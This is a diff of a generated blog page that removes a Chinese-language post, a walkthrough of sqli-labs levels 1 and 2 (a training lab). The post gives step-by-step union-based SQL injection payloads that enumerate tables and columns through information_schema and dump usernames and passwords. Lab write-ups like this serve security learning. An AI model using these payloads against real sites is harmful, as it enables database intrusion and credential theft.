@@ -145,91 +145,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/article-title-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Yanghaoxuan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yanghaoxuan'sBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/12/article-title-2/" class="post-title-link" itemprop="url">sqli-labs练习(第一、二关):字符型与数字型</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-12 14:05:01 / 修改时间：15:08:57" itemprop="dateCreated datePublished" datetime="2020-12-12T14:05:01+08:00">2020-12-12</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="第一关（字符型）"><a href="#第一关（字符型）" class="headerlink" title="第一关（字符型）"></a>第一关（字符型）</h1><h2 id="1、判断是数字型还是字符型"><a href="#1、判断是数字型还是字符型" class="headerlink" title="1、判断是数字型还是字符型"></a>1、判断是数字型还是字符型</h2><p>在url后面分别添加<code>?id=1, ?id=2, ?id=2-1</code> ，观察页面的变化，判断是字符型还是数字型。<br>（如果id=2-1 与 id=1的页面一样，就是数字型；如果id=2-1与id=2的页面一样，就是字符型）</p>
-<h2 id="2、通过报错判断闭合符"><a href="#2、通过报错判断闭合符" class="headerlink" title="2、通过报错判断闭合符"></a>2、通过报错判断闭合符</h2><p>在id=2后面分别加上<code>&#39;</code> , <code>&quot;</code> 即单引号，双引号，发现加<code>&#39;</code>时报错了，而加<code>&quot;</code>是正常显示，说明闭合符是<code>&#39;</code>。所以我们应该使用<code>&#39;</code>，让它闭合。</p>
-<h2 id="3、确认查询的字段数量"><a href="#3、确认查询的字段数量" class="headerlink" title="3、确认查询的字段数量"></a>3、确认查询的字段数量</h2><p>在后面分别添加<code>order by 1 --+</code>，<code>order by 2 --+</code>，<code>order by 3 --+</code>……<code>order by n --+</code>，观察是否报错，我们发现在by 3的时候还是正常的，而by 4的时候就没了，说明要查询的字段数量是3个。</p>
-<h2 id="4、确认占位信息"><a href="#4、确认占位信息" class="headerlink" title="4、确认占位信息"></a>4、确认占位信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…… union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p>把id的值换成-1，不让它显示正常的值，然后在后面加上union select 1,2,3 –+。查看字段的占位信息。</p>
-<p><img src="C:\Users\Y4n9ne\Desktop\20200717113323491.png" alt="20200717113323491"></p>
-<p>1的位置是dhakkan，固定的，只能在2,3下手。</p>
-<h2 id="5、找库名"><a href="#5、找库名" class="headerlink" title="5、找库名"></a>5、找库名</h2><p><code>…… union select 1,2,database() --+</code>，把3换成database(),即在输出3的地方输出数据库名。</p>
-<p><img src="C:\Users\Y4n9ne\Desktop\20200717113457752.png" alt="20200717113457752"></p>
-<p>发现数据库名字是<code>security</code></p>
-<h2 id="6、查表名"><a href="#6、查表名" class="headerlink" title="6、查表名"></a>6、查表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…… union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
-
-<p>group_concat()是把要输出的内容都放在一个分组里输出，如果不加的话，就只会输出第一个表名。</p>
-<h2 id="7、找表字段"><a href="#7、找表字段" class="headerlink" title="7、找表字段"></a>7、找表字段</h2><p>至于找哪个表里的内容，当然是users表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…… union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\Y4n9ne\Desktop\20200717114338128.png" alt="20200717114338128"></p>
-<p>users表里有id，username，password三个字段。</p>
-<h2 id="8、找用户名和密码"><a href="#8、找用户名和密码" class="headerlink" title="8、找用户名和密码"></a>8、找用户名和密码</h2><p><code>…… union select 1,2,group_concat(concat_ws(&#39;,&#39;,username,password)) from users --+</code></p>
-<p>concat_ws这个函数将username和password用逗号分开。</p>
-<h1 id="第二关（数字型）"><a href="#第二关（数字型）" class="headerlink" title="第二关（数字型）"></a>第二关（数字型）</h1><h2 id="1、先判断是字符型还是数字型。"><a href="#1、先判断是字符型还是数字型。" class="headerlink" title="1、先判断是字符型还是数字型。"></a>1、先判断是字符型还是数字型。</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.11.222&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
-
-<p>id=2-1 与 id=1的结果一样，说明是数字型。</p>
-<h2 id="2、确认字段位数"><a href="#2、确认字段位数" class="headerlink" title="2、确认字段位数"></a>2、确认字段位数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.11.222&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 order by 3</span><br></pre></td></tr></table></figure>
-
-<p>接下来的步骤与第一关相同，只是少了第二步的<code>&quot;</code> 或 <code>&#39;</code>而已。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/23/article-title-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -500,7 +415,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
